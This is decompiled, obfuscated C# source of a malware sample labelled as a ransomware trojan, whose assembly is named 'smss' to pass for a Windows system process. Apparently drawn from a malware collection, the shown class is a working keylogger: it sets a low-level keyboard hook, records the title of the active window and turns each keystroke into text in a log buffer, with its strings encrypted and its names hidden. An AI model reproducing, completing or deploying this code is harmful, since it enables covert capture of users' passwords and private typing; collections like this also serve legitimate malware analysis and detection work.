// Decompiled with JetBrains decompiler
// Type: .
// Assembly: smss, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: E062C21C-108A-4088-B8AD-F222EA4C3418
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-29f84241ce2d6a79cfefca98655fcd4fd54dd724bded5f239ceefec315a648b5.exe

using \u0004;
using \u0005;
using \u0006;
using \u0008;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace \u0005
{
  internal class \u0003
  {
    private string \u0001;
    private static IntPtr \u0002;
    private static string \u0003;
    private static \u0003.\u0002 \u0004;
    [NonSerialized]
    internal static \u0004.\u0005 \u0008;

    static \u0003()
    {
      System.Type type = typeof (\u0003);
      if (true)
        goto label_2;
label_1:
      \u0003.\u0002 = \u0087\u0002.\u0082\u0003(0);
      \u0003.\u0003 = \u0003.\u0008(324);
      \u0003.\u0004 = (\u0003.\u0002) null;
      return;
label_2:
      \u0002.\u0001(type);
      goto label_1;
    }

    public static string \u0001([In] IntPtr obj0)
    {
      string str;
      try
      {
        if (obj0.ToInt32() <= 0)
        {
          str = (string) null;
        }
        else
        {
          int num = \u0003.\u0001(obj0);
          if (num == 0)
          {
            str = (string) null;
          }
          else
          {
            StringBuilder stringBuilder = new StringBuilder(checked (num + 1));
            \u0003.\u0001(\u0088\u0002.\u0084\u0003(obj0), stringBuilder, \u0003.\u007E\u0005((object) stringBuilder));
            str = global::\u0004.\u007E\u0014((object) global::\u0004.\u007E\u0013((object) stringBuilder));
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u000F.\u001D();
      }
      return str;
    }

    public static void \u0001()
    {
      try
      {
        \u0003.\u0004 = new \u0003.\u0002(\u0003.\u0001);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u000F.\u001D();
      }
      try
      {
        \u0003.\u0002 = \u0087\u0002.\u0082\u0003(\u0003.\u0001(13, \u0003.\u0004, \u0088\u0002.\u0084\u0003(\u008A\u0002.\u007E\u0088\u0003((object) \u0089\u0002.\u007E\u0087\u0003((object) global::\u0005.\u0018()))), 0));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u000F.\u001D();
      }
    }

    [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0001([In] int obj0, [In] \u0003.\u0002 obj1, [In] int obj2, [In] int obj3);

    public static int \u0001([In] int obj0, [In] int obj1, [In] ref \u0003.\u0001 obj2)
    {
      try
      {
        string str = \u0003.\u0001(\u0003.\u0001());
        if (\u0007.\u001A(str, \u0003.\u0003, false) != 0)
        {
          \u0003.\u0003 = str;
          string[] strArray = new string[7]
          {
            \u0001.\u0001,
            \u008B.\u001A\u0002(),
            \u0001.\u0001(\u0003.\u0008(7774), \u0003.\u0008(382)),
            str,
            \u0001.\u0001(\u0003.\u0008(7839), \u0003.\u0008(382)),
            \u008B.\u001A\u0002(),
            \u008B.\u001A\u0002()
          };
          \u0001.\u0001 = \u008D.\u001C\u0002(strArray);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u000F.\u001D();
      }
      try
      {
        string str1 = \u0003.\u0008(324);
        if (obj1 == 256 | obj1 == 260)
        {
          switch (obj2.\u0001)
          {
            case 8:
              \u0001.\u0001 = \u0017\u0002.\u007E\u000E\u0003((object) \u0001.\u0001, 0, checked (\u0003.\u007E\u0004((object) \u0001.\u0001) - 1));
              break;
            case 9:
              str1 = \u008D\u0002.\u008B\u0003(9);
              break;
            case 13:
              str1 = \u008B.\u001A\u0002();
              break;
            case 20:
              str1 = !\u008E\u0002.\u008D\u0003(Keys.Capital) ? \u0001.\u0001(\u0003.\u0008(8072), \u0003.\u0008(382)) : \u0001.\u0001(\u0003.\u0008(8039), \u0003.\u0008(382));
              break;
            case 27:
              str1 = \u0001.\u0001(\u0003.\u0008(8022), \u0003.\u0008(382));
              break;
            case 32:
              str1 = \u0001.\u0001(\u0003.\u0008(7954), \u0003.\u0008(382));
              break;
            case 35:
              str1 = \u0001.\u0001(\u0003.\u0008(8376), \u0003.\u0008(382));
              break;
            case 36:
              str1 = \u0001.\u0001(\u0003.\u0008(8359), \u0003.\u0008(382));
              break;
            case 37:
              str1 = \u0001.\u0001(\u0003.\u0008(8153), \u0003.\u0008(382));
              break;
            case 38:
              str1 = \u0001.\u0001(\u0003.\u0008(8166), \u0003.\u0008(382));
              break;
            case 39:
              str1 = \u0001.\u0001(\u0003.\u0008(8127), \u0003.\u0008(382));
              break;
            case 40:
              str1 = \u0001.\u0001(\u0003.\u0008(8140), \u0003.\u0008(382));
              break;
            case 46:
              str1 = \u0001.\u0001(\u0003.\u0008(8005), \u0003.\u0008(382));
              break;
            case 48:
            case 49:
            case 50:
            case 51:
            case 52:
            case 53:
            case 54:
            case 55:
            case 56:
            case 57:
              if (\u0017.\u007E\u008A((object) \u008B\u0002.\u007E\u0089\u0003((object) \u0001.\u0001())))
              {
                string str2 = \u0001.\u0001(\u0003.\u0008(7904), \u0003.\u0008(382));
                string[] strArray = \u0084\u0002.\u007E\u0080\u0003((object) str2, new char[1]
                {
                  \u008C\u0002.\u008A\u0003(\u0001.\u0001(\u0003.\u0008(7945), \u0003.\u0008(382)))
                });
                switch (obj2.\u0001)
                {
                  case 48:
                    str1 = strArray[9];
                    break;
                  case 49:
                    str1 = strArray[0];
                    break;
                  case 50:
                    str1 = strArray[1];
                    break;
                  case 51:
                    str1 = strArray[2];
                    break;
                  case 52:
                    str1 = strArray[3];
                    break;
                  case 53:
                    str1 = strArray[4];
                    break;
                  case 54:
                    str1 = strArray[5];
                    break;
                  case 55:
                    str1 = strArray[6];
                    break;
                  case 56:
                    str1 = strArray[7];
                    break;
                  case 57:
                    str1 = strArray[8];
                    break;
                }
              }
              else
              {
                str1 = \u008D\u0002.\u008B\u0003(obj2.\u0001);
                break;
              }
              break;
            case 65:
            case 66:
            case 67:
            case 68:
            case 69:
            case 70:
            case 71:
            case 72:
            case 73:
            case 74:
            case 75:
            case 76:
            case 77:
            case 78:
            case 79:
            case 80:
            case 81:
            case 82:
            case 83:
            case 84:
            case 85:
            case 86:
            case 87:
            case 88:
            case 89:
            case 90:
              str1 = !\u0017.\u007E\u008A((object) \u008B\u0002.\u007E\u0089\u0003((object) \u0001.\u0001())) ? global::\u0004.\u007E\u0012((object) \u008D\u0002.\u008B\u0003(checked (obj2.\u0001 + 32))) : global::\u0004.\u007E\u0015((object) \u008D\u0002.\u008B\u0003(checked (obj2.\u0001 + 32)));
              break;
            case 112:
            case 113:
            case 114:
            case 115:
            case 116:
            case 117:
            case 118:
            case 119:
            case 120:
            case 121:
            case 122:
            case 123:
            case 124:
            case 125:
            case 126:
            case (int) sbyte.MaxValue:
            case 128:
            case 129:
            case 130:
            case 131:
            case 132:
            case 133:
            case 134:
            case 135:
              str1 = \u0095.\u0083\u0002(\u0001.\u0001(\u0003.\u0008(8105), \u0003.\u0008(382)), \u008D\u0002.\u008C\u0003(checked (obj2.\u0001 - 111)), \u0001.\u0001(\u0003.\u0008(8118), \u0003.\u0008(382)));
              break;
            case 162:
            case 163:
              str1 = \u0001.\u0001(\u0003.\u0008(7963), \u0003.\u0008(382));
              break;
            case 164:
            case 165:
              str1 = \u0001.\u0001(\u0003.\u0008(7988), \u0003.\u0008(382));
              break;
            case 186:
              str1 = !\u0017.\u007E\u008A((object) \u008B\u0002.\u007E\u0089\u0003((object) \u0001.\u0001())) ? \u0001.\u0001(\u0003.\u0008(8287), \u0003.\u0008(382)) : \u0001.\u0001(\u0003.\u0008(5900), \u0003.\u0008(382));
              break;
            case 187:
              str1 = !\u0017.\u007E\u008A((object) \u008B\u0002.\u007E\u0089\u0003((object) \u0001.\u0001())) ? \u0001.\u0001(\u0003.\u0008(8224), \u0003.\u0008(382)) : \u0001.\u0001(\u0003.\u0008(8215), \u0003.\u0008(382));
              break;
            case 188:
              str1 = !\u0017.\u007E\u008A((object) \u008B\u0002.\u007E\u0089\u0003((object) \u0001.\u0001())) ? \u0001.\u0001(\u0003.\u0008(8323), \u0003.\u0008(382)) : \u0001.\u0001(\u0003.\u0008(8314), \u0003.\u0008(382));
              break;
            case 189:
              str1 = !\u0017.\u007E\u008A((object) \u008B\u0002.\u007E\u0089\u0003((object) \u0001.\u0001())) ? \u0001.\u0001(\u0003.\u0008(8206), \u0003.\u0008(382)) : \u0001.\u0001(\u0003.\u0008(8197), \u0003.\u0008(382));
              break;
            case 190:
              str1 = !\u0017.\u007E\u008A((object) \u008B\u0002.\u007E\u0089\u0003((object) \u0001.\u0001())) ? \u0001.\u0001(\u0003.\u0008(8341), \u0003.\u0008(382)) : \u0001.\u0001(\u0003.\u0008(8332), \u0003.\u0008(382));
              break;
            case 191:
              str1 = !\u0017.\u007E\u008A((object) \u008B\u0002.\u007E\u0089\u0003((object) \u0001.\u0001())) ? \u0001.\u0001(\u0003.\u0008(3513), \u0003.\u0008(382)) : \u0001.\u0001(\u0003.\u0008(8350), \u0003.\u0008(382));
              break;
            case 192:
              str1 = !\u0017.\u007E\u008A((object) \u008B\u0002.\u007E\u0089\u0003((object) \u0001.\u0001())) ? \u0001.\u0001(\u0003.\u0008(8188), \u0003.\u0008(382)) : \u0001.\u0001(\u0003.\u0008(8179), \u0003.\u0008(382));
              break;
            case 219:
              str1 = !\u0017.\u007E\u008A((object) \u008B\u0002.\u007E\u0089\u0003((object) \u0001.\u0001())) ? \u0001.\u0001(\u0003.\u0008(8242), \u0003.\u0008(382)) : \u0001.\u0001(\u0003.\u0008(8233), \u0003.\u0008(382));
              break;
            case 220:
              str1 = !\u0017.\u007E\u008A((object) \u008B\u0002.\u007E\u0089\u0003((object) \u0001.\u0001())) ? \u0001.\u0001(\u0003.\u0008(8278), \u0003.\u0008(382)) : \u0001.\u0001(\u0003.\u0008(8269), \u0003.\u0008(382));
              break;
            case 221:
              str1 = !\u0017.\u007E\u008A((object) \u008B\u0002.\u007E\u0089\u0003((object) \u0001.\u0001())) ? \u0001.\u0001(\u0003.\u0008(8260), \u0003.\u0008(382)) : \u0001.\u0001(\u0003.\u0008(8251), \u0003.\u0008(382));
              break;
            case 222:
              str1 = !\u0017.\u007E\u008A((object) \u008B\u0002.\u007E\u0089\u0003((object) \u0001.\u0001())) ? \u0001.\u0001(\u0003.\u0008(8305), \u0003.\u0008(382)) : \u0001.\u0001(\u0003.\u0008(8296), \u0003.\u0008(382));
              break;
            default:
              str1 = \u008D\u0002.\u008B\u0003(obj2.\u0001);
              break;
          }
          \u0001.\u0001 = \u0011.\u0081(\u0001.\u0001, str1);
          \u0001.\u000E\u0002 = \u0001.\u0001;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u000F.\u001D();
      }
      int num;
      return num;
    }

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", SetLastError = true)]
    public static extern IntPtr \u0001();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \u0001([In] int obj0, [In] StringBuilder obj1, [In] int obj2);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLength", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int \u0001([In] IntPtr obj0);

    public \u0003([In] string obj0)
    {
      try
      {
        this.\u0001 = obj0;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public struct \u0001
    {
      public int \u0001;
      public int \u0002;
      public int \u0003;
      public int \u0004;
      public int \u0005;
    }

    private delegate int \u0002(int Code, int wParam, ref \u0003.\u0001 lParam);
  }
}
